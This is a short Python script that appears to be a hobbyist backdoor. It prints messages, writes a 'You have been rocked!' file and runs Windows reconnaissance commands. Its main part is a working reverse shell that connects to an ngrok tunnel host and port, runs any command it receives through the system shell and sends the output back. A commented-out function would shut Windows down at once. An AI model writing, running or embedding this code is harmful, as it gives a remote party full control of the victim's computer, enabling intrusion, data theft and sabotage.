import os


print("This is done bro again")  # Prints a message

def create_hello_file(filename):
    with open(filename, 'w') as file:
        file.write("You have been rocked!")

create_hello_file("hello.txt")    # Creates the file
print("File 'hello.txt' created with message.")


#commands
import subprocess

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, text=True, capture_output=True)
        if result.stdout:
            print("Output:\n", result.stdout)
        if result.stderr:
            print("Error:\n", result.stderr)
    except Exception as e:
        print("Failed to run command:", e)

# ====== EXAMPLE COMMANDS TO RUN ======
run_command("ipconfig")
run_command("echo Hello, world!")
run_command("dir C:\\")  # List C drive contents


import socket
import subprocess

IP = "0.tcp.in.ngrok.io"   # ngrok host
PORT = 17203               # ngrok port 

s = socket.socket()
s.connect((IP, PORT))

while True:
    command = s.recv(1024).decode().strip()
    if command.lower() in ['exit', 'quit']:
        break

    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
        try:
            output, error = process.communicate(timeout=5)  # wait max 5 seconds
        except subprocess.TimeoutExpired:
            process.kill()
            output, error = '', '[!] Command timed out or blocked'

        response = output + error
        if not response.strip():
            response = '[✓] Command executed (no output)'
    except Exception as e:
        response = f'[!] Error: {str(e)}'

    s.send(response.encode())

s.close()


#def shutdown_windows():
    #print('shutting down bro')
    #os.system("shutdown /s /t 0")  # Shutdowns Windows after 2 seconds

#shutdown_windows()                # Executes the shutdown
